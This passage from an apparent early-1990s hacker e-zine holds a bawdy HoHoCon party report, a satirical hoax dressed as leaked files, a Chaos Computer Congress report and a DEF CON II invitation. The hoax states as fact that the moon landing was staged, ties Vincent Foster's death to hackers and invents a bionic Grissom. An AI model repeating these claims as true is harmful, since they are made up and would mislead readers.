and dismayed by, but unfortunately he wasn&#039;t in the room.  Perhaps
he didn&#039;t have the cash to get in.

Everyone in the room was having a blast.  Consultants, reporters, and hackers
all equally sharing in the debauchery.  Zar gave new meaning to the word
&quot;man-handling.&quot;  I can only thank God that I had sold all my shirts,
so I had cash to spare.

The night went on, the beer flowed, the dopamine inhibitors kicked
in full force, and the money changed hands faster than could be counted.
By the end of the evening, everyone had received several &quot;table dances,&quot;
KevinTX had whip marks on his back, Weevil had won my complete admiration,
and the girls made a small fortune.  Each of the dancers walked away with
over $200 in cash.  The biggest winner was a really hot little 18 year-old
named Cathy who raked in almost $400.

As the night drew to a close, the room emptied, the girls gathered up
their outfits and made for home, or paired up to go somewhere else.

I awoke Sunday somewhere else.  No comment.  (I couldn&#039;t anyway, since I
have no recollection.)

So ended HoHoCon.

                            &quot;Quentin Strikes Again&quot;

     In the Fall of 1992, &quot;NBC: Dateline&quot; aired a show on computer hackers,
interviewing Erik Bloodaxe, Doc Holiday and a person named &quot;Quentin.&quot;  Half-
way through the show, Quentin is shown with his back to the camera, text
scrolling across his screen.  Dateline seemed oblivious: on closer inspection,
Quentin was displaying a file which listed various MIL and GOV sites which
allegedly had &quot;autopsies of extra-terrestrials on record&quot;, information about
UFO crash sites, detailed governmental research on alien beings.
     By December, that Dateline episode had created quite a stir within the
hacker community.  Who was Quentin?  What file was he displaying?  Was this an
elaborate hoax, a joke which failed to gain the attention of NBC?  At HoHoCon
&#039;92 in Houston, Bloodaxe and Holiday explained that the file did exist and the
information it contained was in fact true.  Lending some credence to the
story, well-placed sources indicated that the White House had requested a copy
of the episode from NBC.
     Bloodaxe and Holiday refused to name the people involved, but explained
that a relatively unknown group had formed to pursue a project they referred
to variously as &quot;Project ALF&quot; and &quot;Project Green Cheese&quot;, searching government
computers for any evidence which might verify a UFO cover-up.  Apparently they
struck pay dirt.
     By the Summer of 1993, at least one member of Project Green Cheese had
&quot;disappeared.&quot;  White House aide Vincent Foster turned up dead after an
apparent suicide; among documents found in Foster&#039;s office possibly linking
President Clinton to a failed Arkansas Savings &amp; Loan, a videotape was also
found: the Dateline episode on Hackers.

     Apparently buoyed by their success, the Green Cheese group began scanning
an unpublished prefix in the 202 NPA toward the end of the Summer.  They were
surprised to learn that nearly every number in that prefix was answered by the
same authoritative voice asking, &quot;Who is this?&quot;  Not to be discouraged, the
group continued until they happened upon a lone DEC Server.
     There they uncovered documentation suggesting a covert action of a
different kind: a cover-up instigated by the three-letter agencies and NASA,
perpetrated upon the public with the unwitting aid of the media in the early
1970s, beginning with the death of three astronauts.
     What follows is an excerpt of their discovery.

BACKGROUND, PROJECT CAPRICORN
----------  ------- ---------

     By 1965, NASA&#039;s public relations machine was in high gear, advertising
amazing (and non-existant) advances in American space technology and setting
an ambitious schedule for the Space Agency&#039;s top priority: a manned space
flight to the moon by the end of the decade.
     Despite the few successes NASA and the Air Force had had with rocketry,
in a memo to the President, dated 11/13/67, NASA reluctantly expressed some
doubt that a moon mission could be accomplished even by 1973.  The President
made it clear that the moon mission was, by now, more of a political mission
than one of science, and its success was of the utmost national priority.
World sentiment at the time favored the Russians, their flawless successes a
seeming vindication of the power and motivation of the Communist system.
Further, the President felt that a success could deflect attention from the
Vietnam war and re-invigorate public sentiment in the United States toward the
nation, the Administration, and the ingenuity of American technology.
     As a contingency for failure, CAPRICORN was instigated, its final
approval to be decided by the middle of the following year in a meeting
between the President, DIRNASA, DIRCIA, DIRNSA and attendant adjutants.  The
President summed CAPRICORN up in these words, &quot;If we can&#039;t be heroes, we can
damn well act like heroes!&quot;
     CAPRICORN&#039;s mission was a relatively simple one: covert deception of the
public and media, under the guidance of PSYOPS and PPYRUS; a manned moon
mission would be simulated and pre-recorded in a controlled environment, later
to be broadcast &quot;live.&quot;
     By June of 1968, CAPRICORN was recommended and Presidential approval
given.

BACKGROUND, PROJECT CAPRICORN (cont&#039;d)
----------  ------- ---------

     CAPRICORN was an unqualified success resulting in, among other things,
later congressional approval for a large appropriation of funds to further
NASA&#039;s successful research.


BACKGROUND, PROJECT UMENSCH
----------  ------- -------

     In February of 1963, DARPA gained oversight of an ancillary NASA research
project that began with the discovery of efficient micro-machines and light,
extraordinarily strong alloys.  These new discoveries implied the possibility
for advance along a relatively new field of science: cybernetics.  DARPA
reacted enthusiastically by forming project UMENSCH.
     Most information on UMENSCH, DARPA is unwilling to share.  But this much
is clear: under the direction of DARPA, NASA got the opportunity to test this
technology on a human subject with the crash of an experimental flying-wing in
1966.
     As his CLASSIFIED service record indicates for the years 1960 - 1965,
Lieutenant Colonel Virgil Grissom (see Air Force files for Grissom, Virgil I.,
USAF 563-87-2981; CI DL 118-26-9069) had an exemplary record as an Air Force
test pilot, including a stint as a U2 pilot during 1956-1959, performing
reconaissance missions over Cuba and Southeastern China.  In fact, it was
Grissom&#039;s missions which confirmed the mass starvation of over 10 million
Manchurian Chinese in 1959.
     Grissom barely survived an XF-17 crash at Edwards Air Force Base,
September 17, 1966.  His right arm was badly crushed during an emergency
ejection shortly after take-off.
     DARPA offered Grissom a chance to regain the limb through risky, untried
technology: a cybernetically-enhanced prosthetic implant.  DARPA termed the
marriage of cybernetic implants with biology, BIONICs.
     The surgery was successful well beyond UMENSCH&#039;s projections; not only
did Grissom&#039;s BIONIC arm function as well as his original arm, but in
conjunction with a BIONICly enhanced upper skeleture, Virgil&#039;s right arm was
capable of lifting several hundred pounds and inflicting marked fatigue in
steel objects.
     DARPA&#039;s investment of technology and secrets in Virgil Grissom in effect
made Grissom UMENSCH property and necessarily privy to several sensitive
projects.

BACKGROUND, PROJECT UMENSCH (cont&#039;d)
----------  ------- -------

     Colonel Grissom was an obvious astronaut candidate and by the following
year was training for GEMINI.  In fact, because of Grissom&#039;s access to a
project as sensitive as UMENSCH, Grissom was later tapped to aid in the
staging of CAPRICORN.


THE APOLLO LAUNCHPAD FIRE; GRISSOM, YOUNG, &amp; WHITE
--- ------ --------- ----  -------  -----  - -----

     You&#039;re already well aware of the fire this July on the Apollo launchpad,
which reportedly killed astronauts Grissom, Young and White.
     What you are not aware of, however, is that Grissom managed, with the aid
of BIONICs, to escape the space capsule just before Young and White were
asphixiated.  It is not clear why Grissom apparently made no attempt to rescue
his crew-mates or why he used the ensuing confusion to leave Canaveral.
     For whatever reason, Grissom is now a loose-cannon.  Despite a massive,
but low-key manhunt, the officially-dead ex-astronaut&#039;s whereabouts are
currently unknown, though we have reason to believe he may have made his way
to California or Texas.
     We suspect dissolution with the American space program -- CAPRICORN, in
particular -- may lead Grissom to go public and compromise UMENSCH and
CAPRICORN.

BACKGROUND, PROJECT DPULTRA
----------  ------- -------

       &quot;The most convincing lie is the one that&#039;s half true...&quot;
                       -- Samuel Butler

     DPULTRA is a damage-control project of utmost priority.  Its goal is to
desensitize the American public to the potential existence of a BIONIC-enabled
man and secondarily, any allegations concerning CAPRICORN, the ludicrous
portrayal of the first discrediting the second.
     PSYOPS&#039; proposed project involves the production of a network television
show, produced in part with Company funds, Pro-US propagandizing, which will
lionize the American Intelligence Community and plant the seed in the public&#039;s
mind that projects like CAPRICORN and UMENSCH are impossible -- due to the
inherent silliness of the show&#039;s plotlines, week after week.

BACKGROUND, PROJECT DPULTRA (cont&#039;d)
----------  ------- -------

     DPULTRA&#039;s success is directly related to the Nielsen ratings it can
garnish and to ensure its success, PSYOPS personnel will be involved in
writing the scripts.
     PSYOPS suggests peppering the show&#039;s plots with psychological archetypes
-- symbols from Jung&#039;s collective unconscious -- and possibly even subliminals
(if need be).  The story line will, nevertheless, be played straight but also
utterly implausibly.

     I would like to discuss DPULTRA further with you in person at our next
Monday-morning meeting.

PROJECT DPULTRA OUTLINE
------- ------- -------

     Following our meeting Monday, this is an update on DPULTRA.

     In keeping with our RMD objectives, we&#039;ve begun working on ideas this
week.  Much progress, although finished scripts are probably a month or two
away, depending on the final series terms from American Broadcasting.
     Weve settled on character names and sketches:


                              DRAMATIS PERSONAE

Dr. Rudy Wells,   An otherwise unremarkable man, the genius behind BIONICs
Oscar Goldman,    Director of a secret governmental intelligence agency, OSI
Steve Austin,     Astronaut/Test Pilot/OSI Agent; renowned as the
                        first Man on the Moon.  Similarity to the name
                        Sam Houston results from the necessity to attract
                        Texas viewers particularly (as well as Californians).


     Following is a list of show ideas for the first season, along with input
from the PSYOPS officers.  PSYOPS wants us to plant collective archetypes and
possibly subliminals in order to carve the show&#039;s subtext into the mind as
deep as possible, and to generate the largest market share possible.
     These psychological implants will be joined with or disguised under
ephemeral pop culture references, such as UFOs, Aztecs, Bigfoot, Cold Warrior,
Earthquakes, the mystique of the American Indian, and the paranormal.

Fembots,          Female grotesques; &quot;All this, and BIONICs, too!&quot;  Evil
                        androids created by an unnamed, nefarious agency

     Abridged list of possible episodes include:

Sasquatch
---------

During an OSI science investigation of the San Andreas fault in the wilderness
of Northern California, Steve encounters Big Foot.  Steve later learns that
Big Foot is the product of extra-terrestrial genetics and cybernetics, but his
purpose on Earth is never clarified.  In a later episode, Steve re-visits the
heavily forrested area and initiates a friendship with Sasquatch, eventually
saving his life.

Venus Probe
-----------

An interplanetary probe (like the planned Viking probes) destined for Venus
slingshots through the alien atmosphere and returns to Earth.  Its computer
program doesn&#039;t realize that anything&#039;s wrong, so it begins its collection
routines.  Unfortunately, it has returned to our planet with an extremely
tough armor plating (resulting from a chemical reaction with Venus&#039;s
atmosphere) and it&#039;s zigzagging its way through Southern California.  It
possesses wicked collection equipment which in this environment are effective
weapons.  Anyone who gets near it is in great danger.  Eventually, Steve and
the national guard defeat the device by luring it into an open pit filled with
very caustic acid.

Amnesia
-------

As the result of a head injury, Steve is stricken with amnesia.  Consequently,
forgets that he possesses bionic powers.  He ends up living out an alternate
possible life -- moves in with a woman and gets a job as a construction
worker.  Everything is fine until Steve happens upon a woman and her child,
pinned inside a wrecked car.  He tears away the metal and extricates the
people, who are grateful but become frightened when they see wires sticking
out of a tear in his flannel shirt.  Eventually, OSI catches up to him before
anything too out of hand occurs, and Steve regains his memory by episode&#039;s
end.

     If this show is a success in its first season, PSYOPS would like to
consider a spin-off involving a second BIONIC character.  The spin-off would
include:

                              ADDITIONAL CHARACTERS

Jamie Sommers,    Substitute Teacher/ex-Tennis Pro; an unlikely OSI agent;
                        A love-interest for Steve, Jamie obtains her BIONICs
                        after a parachuting accident
Max the Dog,      Formerly a laboratory subject, horribly burnt in a fire;
                        Now BIONIC-enabled.  Psychologically traumatized, Max
                        goes berserk at the first sign of flame

Jamie Sommers
-------------

Jamie, a Junior Highschool substitute teacher and ex-Tennis pro, and Steve are
engaged to be married.  At this point, Jamie knows nothing of Steve&#039;s
involvement with OSI or his BIONIC abilities.  On a vacation parachuting trip,
Jamie is injured, paralyzed.  Steve pleads with Dr. Wells to restore her limbs
through BIONICs.  Wells accedes.  Except that Jamie has amnesia and has no
idea who Steve is.
     Jamie is instructed in her new BIONIC abilities, and begins to exercise
them, when her body rejects the BIONIC implants, physically and emotionally
traumatizing Jamie.  OSI eventually solves the implant rejection problem, but
Rudi cautions Steve that if he tells her of her past, it may induce the trauma
of the BIONIC rejection.  Steve lives with the pain of knowing that Jamie is
his first love and that, for fear of her safety, can never tell her.

Aztec Warrior
----- -------

Investigating an abandoned WW II bunker along the California coast which seems
to be emitting powerful radio-frequencies, Jamie discovers that an ancient
Aztec pyramid lies below the bunker&#039;s foundation and is now accessible through
a hidden tunnel.  In the pyramid, Jamie is confronted with an 800-year-old
Aztec warrior bent on protecting the contents of the pyramid and repelling
intruders.  In an allusion to CHARIOTS OF THE GODS, extra-terrestrials are
receiving from the pyramid&#039;s beacon the electronic version of an invitation to
re-visit the planet.  Jamie learns, however, that chemicals seeded into the
atmosphere as part of a NASA project to end continental drought will
ultimately interfere with the propulsion system of the alien craft.  Fearing
the accidental destruction of the aliens will bring extra-terrestrial
retaliation, Jamie thwarts the Aztec guard and destroys the beacon.

SUBJ: DPULTRA


     Nearly two years into the project, I congratulate you on DPULTRA&#039;s
success; the show has consistently rated high in the Nielsens, topping
&quot;Starsky &amp; Hutch&quot; and occasionally beating out &quot;M*A*S*H*&quot;.
     However, there seem to be several problems and the show requires a nearly
intolerable suspension of disbelief.  To wit:

      1.    Running at 60 mph, why doesn&#039;t the Bionic Man&#039;s sneakers ever
            wear out?
      2.    Steve Austin never received a Bionic heart, spine, respiratory
            system, musculature or skeleture.  How is it that his body
            doesn&#039;t collapse when he lifts objects that weigh tons?
      3.    Most of Steve&#039;s body seems to be metallic; how does he make
            it past airport metal detectors?
      4.    How can Steve&#039;s Bionics defy principles of physics, like inertia?
      5.    Steve&#039;s Bionic implants are nuclear-powered -- an energy source
            potentially capable of generating more heat than the sun.  How
            can Steve&#039;s Bionics slow down and even fail, when exposed to cold?
      6.    Steve Austin&#039;s Bionics cost $6 Million -- a sum that seems
            laughably inexpensive.  Why is the Bionic Woman&#039;s pricetag
            Classified?
      7.    How can a world-famous, instantly recognizable astronaut make
            a &quot;perfect undercover agent&quot;?
      8.    A bionic dog?  What&#039;s next?  A bionic earthworm?  A bionic
            tarantula?
      9.    Jamie Sommers&#039; cover includes continuing her vocation as a
            substitute teacher; how does she make time to be a secret agent?
      10.   Where do the Fembots come from?  Are they important to the show?
      11.   Re: The Venus Probe episode -- why is a probe whose purpose is
            to collect soil samples, heavily endowed with weapons?  How can
            that probe not realize it&#039;s not on Venus?  If it&#039;s armored enough
            to withstand the atmosphere of Venus, how was Steve able to
            destroy it in a pit of acid?  Why was it malevolent?

****************************************************************************

The 10th Chaos Computer Congress

by Manny E. Farber

  Armed only with an invitation in English addressed to the &quot;global
community&quot; and a small pile of German Marks, I arrived at the
Eidelstedter Buergerhaus about an hour or so before the beginning of
the 10th Chaos Communication Congress (subtitled &quot;Ten years after
Orwell&quot;), sponsored by the (in)famous Chaos Computer Club.  The
Buergerhaus (literally, &quot;citizen&#039;s house&quot;) turned out to be a modest
community hall; needless to say, not all invited showed up.  The
Congress took place between the 27th and the 29th of December.  As the
title implies, social as well as technical issues were on the docket.

  After forking over 30 DM (about $20) for a pass for the first two
days of the Congress, I sort of felt like asking for a schedule, but
refrained, thinking that asking for scheduled chaos might seem a bit
odd.  I went to the cafeteria for breakfast.  An organizer started out
announcing, &quot;Anyone who wants to eat breakfast pays 5 Marks, and gets a
stamp, which--no, rather, anyone who wants breakfast pays 5 Marks and
eats breakfast.&quot;

  The atmosphere was quite collegial and informal, with little more
order than was absolutely necessary.  The approximately 150 attendees
were predominantly German (a few from Switzerland and Holland, at least
-- and probably only -- one from the United States, namely myself),
male, and technically oriented.  (During an explanation of the
mathematical algorithm underlying electronic cash, a non-techie
objected, &quot;But I don&#039;t want to have to think up a 200-digit random
number every time I buy something!&quot;  It was explained to him that this
was done by software in the chip-card ...).

  Although not mentioned in the invitation, not a word of English was to
be heard; all the events were conducted in German.  Some were conducted
in a &quot;talk show&quot; format, with a host asking questions, simplifying
answers, making jokes.  A television network carried the video from the
auditorium to other rooms throughout the building (albeit without
sound) along with up-to-the-minute event schedules.

  The tone of the discussions of how electronic cash could be
embezzled, or chip cards abused, digital signatures forged, etc., was
constructive rather than destructive.  And it was balanced, i.e. not
only &quot;how could a malicious individual embezzle money?&quot; was discussed,
but also &quot;how could the government use chip cards to reduce people&#039;s
privacy?&quot;  Here, the &quot;hackers&quot; were hackers in the positive sense of
understanding a technology, not in the negative sense of wreaking
havoc.  It was, however, noted that trying out a potential weakness of
the &quot;EuroScheck&quot; cash cards was quite easy:  it would require buying a
card reader for 1,500 DM and maybe a week of time.

  The question of technical solutions to &quot;big brother&quot; did come up in
the presentations about chip cards.  The danger is that a pile of cards
is eliminated in favor of a card containing someone&#039;s driver&#039;s license,
driving record (maybe), employee information, credit information, etc.
etc.  A chip card could theoretically be programed to give out *only*
the information absolutely necessary, e.g. telling a policeman only
that someone is allowed to drive, without disclosing his identity.

  The &quot;Hackzentrum&quot; (Hacking Center) turned out to be a room filled
with networked computers and people hacking on them.  It seemed mostly
harmless.  (I nevertheless did not try a remote login -- I had no
reason to doubt good intentions, but on the other hand, who knows who
wrote or replaced the keyboard driver and what sort of supplemental
functionality it might have?)  The packet radio room had a &quot;Digi&quot;
repeating station and, true to the ham radio tradition, where the
conversation centers on who is talking to whom and how well they hear
each other and on what other frequency they might hear each other
better, the computers attached were mostly displaying maps of the
packet radio network itself.  I didn&#039;t delve very deeply into the
&quot;Chaos Archive,&quot; but noticed a collection of maintenance sheets for
telephone equipment among CCC newsletters and other paraphenalia.

  Some &quot;signs of the Congress&quot;:

    - Bumper sticker:  &quot;I (heart) your computer&quot;
    - Telephone stickers:  &quot;Achtung, Abhoergefahr&quot; (&quot;Attention,
      Eavesdropping danger&quot;; and the German PTT logo transformed into a
      pirate insignia, with the words &quot;Telefun - Mobilpunk&quot; (derived from
      &quot;Telefon - Mobilfunk&quot;)
    - T-shirt:  &quot;Watching them (eye-ball) watching us&quot;
    - Post-It Note pad (for sale for DM 1.50):  a pad of about 50,
      pre-printed with a hand-written note:  &quot;Vorsicht, Stoerung.
      Automat macht Karte ungueltig&quot; (&quot;Careful--Defect. Machine makes
      card invalid&quot;)
    - Word coinage:  &quot;Gopher-space&quot;
    - Stamp:  &quot;ORIGINALE KOPIE&quot; (&quot;ORIGINAL COPY&quot;)

  The press were told not to take pictures of anyone without their
explicit permission.

  Schedules were distributed throughout the Congress.  By the evening
of the 27th, a schedule for the 28th, &quot;Fahrplan 28.12 Version 2.0,&quot; was
already available (&quot;Fahrplan&quot; means a bus/train schedule; this is
presumably an &quot;in&quot; joke).  By 17:30 on the 28th, &quot;Fahrplan 28.12
Version 2.7&quot; was being distributed.  (I missed most of the intervening
versions; presumably they were neatly filed away in the Chaos Archive
by then ...)

  The scheduled events (in translation) were as follows; a &quot;*&quot; means

-------------------------------------------------------------------------------
THE EAVESDROPING ATTACK

  This has to do with a proposed law making its way through the German
Parliament.  The invitation describes this as &quot;a proposed law reform
allowing state authorities to listen in, even in private rooms, in
order to fight organized crime.&quot;  This session was the centerpiece of
the Congress.  Bayerische Rundfunk, the Bavarian sender, sent a
reporter (or at least a big microphone with their logo on it).  The
panel consisted of:

MdB - Mitglied des Bundestags (Member of Parliament) Peter Paterna
DsB - Datenschutz Beauftragter Hamburg (Data privacy official) Peter Schar
Journalist - from Die Zeit
PTT - a representative from the German PTT
Student - writing a book about related issues
CCC - a few members of the Chaos Computer Club

  My notes are significantly less than a word-for-word transcript.  In
the following, I have not only excerpted and translated, but
reorganized comments to make the threads easier to follow.


  IS IT JUSTIFIED?

MdB - There is massive concern (&quot;Beunruhigung&quot;) in Germany:  7 million
crimes last year.  Using the US as comparison for effectiveness of
eavesdroping, it&#039;s only applicable in about 10-20 cases:  this has
nothing to do with the 7 million.  The congress is nevertheless
reacting to the 7 million, not to the specifics.  In principle, I am
opposed and have concerns about opening a Pandora&#039;s box.

CCC #1 - The 7 million crimes does not surprise me in the least.  I am
convinced that there is a clear relationship between the number of laws
and the number of crimes.  When you make more laws, you have more
crimes.  Every second action in this country is illegal.

Journalist - Laws/crimes correlation is an over-simplification.  There
are more murders, even though there are no more laws against it.

MdB - There is a conflict between internal security, protecting the
constitution, and civil rights.  How dangerous  is 6 billion Marks of
washed drug money to the nation?  Taking the US as an example, the
corrosion may have gone so far that it&#039;s too late to undo it.  I hope
that this point hasn&#039;t been reached yet in Germany.

DsB - I am worried about a slippery slope.  There is a tradeoff between
freedom and security, and this is the wrong place to make it; other
more effective measures aren&#039;t being taken up.


  EFFECTIVENESS OF CONTROLS ON EAVESDROPING

MdB - Supposedly federal controls are effective.  Although there are
very few eavesdroping cases, even if you look at those that are
court-approved, it&#039;s increasing exponentially.  No proper brakes are
built into the system.  As for controls for eavesdroping by the
intelligence service, there is a committee of  three members of
parliament, to whom all cases must be presented.  They have final say,
and I know one of the three, and have relatively much trust in him.
They are also allowed to go into any PTT facility anytime, unannounced,
to see whether or not something is being tapped or not.

MdB - Policies for eavesdroping:  if no trace of an applicable
conversation is heard within the first &quot;n&quot; minutes, they must terminate
the eavesdroping [...]  The question is, at which point the most
effective brakes and regulations should be applied:  in the
constitution?  in the practice?

PTT - True, but often the actual words spoken is not important, rather
who spoke with whom, and when.

DsB - There is no catalog for crimes, saying what measures can be
applied in investigating which crimes.  It&#039;s quite possible to use them
for simple crimes, e.g. speeding.  There is no law saying that the PTT
*has to* store data; they *may*.  They can choose technical and
organizational solutions that don&#039;t require it.

MdB - This is a valid point, I don&#039;t waive responsibility for such
details.  The PTT could be required to wipe out detailed information as
soon as it is no longer needed, e.g. after the customer has been billed
for a call.


  TECHNICAL TRENDS

Journalist - Digital network techniques make it easy to keep trails,
and there is an electronic trail produced as waste product, which can
be used for billing as well as for other purposes.  Load measurements
are allowable, but it can also be used for tracking movements.

DsB - The PTT claims they need detailed network data to better plan the
network.  The government says they need details in order to be able to
govern us better.

DsB - In the past, the trend has always been to increasingly
identificable phone cards.  There is economic pressure on the customer
to use a billing card instead of a cash card, since a telephone unit
costs less.  With &quot;picocells,&quot; your movement profile is getting more
and more visible.

PTT - As for the trend towards less-anonymous billing-cards:  with the
new ISDN networks, this is necessary.  Billing is a major cost, and
this is just a technical priority.

Student - As for techniques to reduce potential for eavesdroping, it
is for example technically possible to address a mobile phone without
the network operator needing to know its position.  Why aren&#039;t such
things being pursued?

PTT - UMTS is quite preliminary and not necessarily economically
feasible.  [Comments about debit cards].  We have more interest in
customer trust than anything else. But when something is according to
the law, we have no option other than to carry it out.  But we don&#039;t do
it gladly.


  THE BIG CONSPIRACY?

CCC #2 - I don&#039;t give a shit about these phone conversations being
overheard.  I want to know why there is such a big controversy.  Who
wants what?  Why is this so important?  Why so much effort?  Why are so
many Mafia films being shown on TV when the eavesdroping law is being
discussed?  What&#039;s up?  Why, and who are the people?

Student - I am writing a book about this, and I haven&#039;t figured this
out myself.  My best theory:  there are some politicians who have lost
their detailed outlook (&quot;Feinbild&quot;), and they should be done away with
(&quot;abgeschaffen&quot;).

PTT - We&#039;re in a difficult position, with immense investments needed to
be able to overhear phone conversations [in digital networks (?)].  We
have no interest in a cover-up.

MdB - As for the earlier question about what NATO countries may do.
During the occupation of Berlin, they did want they wanted on the
networks.  In western Germany, it has always been debated.  Funny
business has never been proved, nor has suspicion been cleared up.

CCC #2 - After further thought, I have another theory.  American
companies are interested in spying on German companies in order to get
a jump on their product offerings.

MdB - That&#039;s clear, but there are more benign explanations.  Government
offices tend towards creating work.  Individuals are promoted if their
offices expand, and they look for new fields to be busy in.  In Bonn,
we&#039;ve gone from 4,000 people to 24,000 since the 50&#039;s.

CCC #1 (to MdB) - Honestly, I don&#039;t see why you people in Bonn are
anything other than one of these impenetrable bureaucracies like you
described, inaccessible, out of touch with reality, and interested only
in justifying their own existence.

MdB - Well, *my* federal government isn&#039;t that.


  CLIPPER CHIP CONTROVERSY

Student - Observation/concern:  in the US, AT&amp;T&#039;s encryption system is
cheap and weak.  If this becomes a de facto standard, it is much harder
to introduce a better one later.

Journalist - In the US, the Clipper chip controversy has centered more
on the lost business opportunities for encryption technology, not on
principles.  There every suggestion for forbidding encryption has
encountered stiff opposition.

Student -  As for the Clipper algorithm, it&#039;s quite easy to invite
three experts to cursorily examine an algorithm (they weren&#039;t allowed
to take documents home to study it) and then sign-off that they have no
complaints.

Journalist - As for the cursory rubber-stamping by the three experts
who certified the Clipper algorithm, my information is that they had
multiple days of computing days on a supercomputer available.  I don&#039;t
see a problem with the algorithm.  The problem lies in the &quot;trust
centers&quot; that manage the keys.  I personally don&#039;t see why the whole
question of cryptology is at all open (&quot;zugaenglich&quot;) for the
government.


  CONCLUDING REMARKS

DsB - The question is not only whether or not politicians are separated
from what the citizens want, but also of what the citizens want.
Germans have a tendency to valuing security.  Different tradition in
the US, and less eavesdroping.  I can imagine how the basic law
(&quot;Grundgesetz&quot;) could be eliminated in favor of regulations designed to
reduce eavesdroping, the trade-off you (MdB) mentioned earlier.  The
headlines would look like &quot;fewer cases of eavesdroping&quot;, &quot;checks built
in to the system,&quot; etc., everyone would be happy, and then once the law
has been abolished, it would creep back up, and then there&#039;s no limit.

MdB - (Nods agreement)

CCC #2 - There are things that must be administered centrally (like the
PTT), and the government is the natural choice, but I suggest that we
don&#039;t speak of the &quot;government,&quot; but rather of &quot;coordination.&quot;  This
reduces the perceived &quot;required power&quot; aspect ... As a closing remark,
I would like to suggest that we take a broader perspective, assume that
a person may commit e.g. 5,000 DM more of theft in his lifetime, live
with that, and save e.g. 100,000 DM in taxes trying to prevent this
degree of theft.

-------------------------------------------------------------------------------
MEDIA AND INFORMATION STRUCTURES

  In this session, a lot of time was wasted in pointless philosophical
discussion of what is meant by Truth, although once this topic was
forcefully ignored, some interesting points came up (I don&#039;t
necessarily agree or disagree with these):

- In electronic media, the receiver has more responsibility for judging
truth placed on his shoulders.  He can no longer assume that the sender
is accountable.  With &quot;Network Trust,&quot; you would know someone who knows
what&#039;s worthwhile, rather than filtering the deluge yourself.  A
primitive form of this already exists in the form of Usenet &quot;kill&quot; files.

- A large portion of Usenet blather is due to people who just got their
accounts cross-posting to the entire world.  The actual posting is not
the problem, rather that others follow it up with a few dozen messages
debating whether or not it&#039;s really mis-posted, or argue that they
should stop discussing it, etc.  People are beginning to learn however,
and the ripple effect is diminishing.

- Companies such as Microsoft are afraid of the Internet, because its
distributed form of software development means they are no longer the
only ones able to marshal 100 or 1,000 people for a windowing system
like X-Windows or Microsoft Windows.

- If someone is trying to be nasty and knows what he&#039;s doing, a Usenet
posting can be made to cost $500,000 in network bandwidth, disk space, etc.

- At a Dutch university, about 50% of the network bandwidth could have
been saved if copies of Playboy were placed in the terminal rooms.
Such technical refinements as Gopher caching daemons pale in comparison.

- All e-mail into or out of China goes through one node.  Suspicious,
isn&#039;t it?

-------------------------------------------------------------------------------
ALTERNATIVE NETWORKS

  Several people reported about computer networks they set up and are
operating.  A sampling:

  APS+Hacktic - Rop Gonggrijp reported about networking services for the
masses, namely Unix and Internet for about $15 per month, in Holland.
There are currently 1,000 subscribers, and the funding is sufficient to
break even and to expand to keep up with exponential demand.

  A German reported about efforts to provide e-mail to regions of
ex-Yugoslavia that are severed from one another, either due to
destroyed telephone lines or to phone lines being shut off by the
government.  A foundation provided them with the funds to use London
(later Vienna), which is reachable from both regions, as a common node.

  The original author of the Zerberus mail system used on many private
German networks complained about the degree of meta-discussion and how
his program was being used for people to complain about who is paying
what for networking services and so forth.  He said he did not create
it for such non-substantial blather.  The difference between now and
several years ago is that now there are networks that work,
technically, and the problem is how to use them in a worthwhile manner.

  A German of Turkish origin is trying to allow Turks in Turkey to
participate in relevant discussions on German networks (in German) and
is providing translating services (if I heard right, some of this
was being done in Sweden).  This killed the rest of the session,
which degenerated into a discussion of which languages were/are/should
be used on which networks.

-------------------------------------------------------------------------------
HOW AN INTELLIGENCE SERVICE WORKS:  STASI TRAINING VIDEOS

  The person introducing the videos sat on the stage, the room
darkened.  The camera blotted out his upper body and face; all that was
to see on the video, projected behind him, was a pair of hands moving
around.

  It apparently didn&#039;t take much to earn a file in the Stasi archives.
And once you were in there, the &quot;10 W&#039;s:  Wo/wann/warum/mit wem/...&quot;
(&quot;where/when/why/with whom/...&quot;) ensured that the file, as well as
those of your acquaintances, grew.

  The videos reported the following &quot;case studies&quot;:

  - The tale of &quot;Eva,&quot; whose materialistic lifestyle, contacts with
Western capitalists, and &quot;Abenteuerromantik&quot; tendencies made her a
clear danger to the state, as well as a valuable operative.  She swore
allegiance to the Stasi and was recruited.  Eventually the good working
relationship deteriorated, and the Stasi had to prevent her from trying
to escape to the West.  The video showed how the different parts of the
intelligence service worked together.

  - A member of the military made a call to the consulate of West
Germany in Hungary.  The list of 10,000 possible travellers to Hungary
in the relevant time frame was narrowed down to 6,000 on the basis of a
determination of age and accent from the recorded conversation, then
down to 80 by who would have any secrets to sell, then down to three
(by hunch?  I don&#039;t remember now).

  One video showed how a subversive was discreetly arrested.  Cameras
throughout the city were used to track his movements.  When he arrived
at his home, a few workers were &quot;fixing&quot; the door, which they claimed
couldn&#039;t be opened at the moment.  They walked him over to the next
building to show him the entrance, and arrested him there.  A dinky
little East German car comes up, six people pile into it.  Two
uniformed police stand on the sidewalk pretending nothing is happening.

=============================================================================

What&#039;s this?  This is an updated announcement and invitation to DEF CON II,
a convention for the &quot;underground&quot; elements of the computer culture.  We try
to target the (Fill in your favorite word here): Hackers, Phreaks, Hammies,
Virii Coders, Programmers, Crackers, Cyberpunk Wannabees, Civil Liberties
Groups, CypherPunks, Futurists, Artists, Etc..

WHO:   You know who you are, you shady characters.
WHAT:  A convention for you to meet, party, and listen to some speeches
       that you would normally never hear.
WHEN:  July 22, 23, 24 - 1994 (Speaking on the 23rd and 24th)
WHERE: Las Vegas, Nevada @ The Sahara Hotel

So you heard about DEF CON I, and want to hit part II?  You heard about the
parties, the info discussed, the bizarre atmosphere of Las Vegas and want to
check it out in person?  Load up your laptop muffy, we&#039;re heading to Vegas!

Here is what Three out of Three people said about last years convention:

&quot;DEF CON I, last week in Las Vegas, was both the strangest and the best
computer event I have attended in years.&quot; -- Robert X. Cringely, Info World

&quot;Toto, I don&#039;t think we&#039;re at COMDEX anymore.&quot; -- CodeRipper, Gray Areas

&quot;Soon we were at the hotel going through the spoils: fax sheets, catalogs,
bits of torn paper, a few McDonald&#039;s Dino-Meals and lots of coffee grounds.
The documents disappeared in seconds.&quot;  -- Gillian Newson, New Media Magazine

DESCRIPTION:

Last year we held DEF CON I, which went over great, and this year we are
planning on being bigger and better.  We have expanded the number of
speakers to included midnight tech talks and additional speaking on Sunday.
We attempt to bring the underground into contact with &quot;legitimate&quot; speakers.
Sure it&#039;s great to meet and party with fellow hackers, but besides that we
try to provide information and speakers in a forum that can&#039;t be found at
other conferences.

While there is an initial concern that this is just another excuse for the
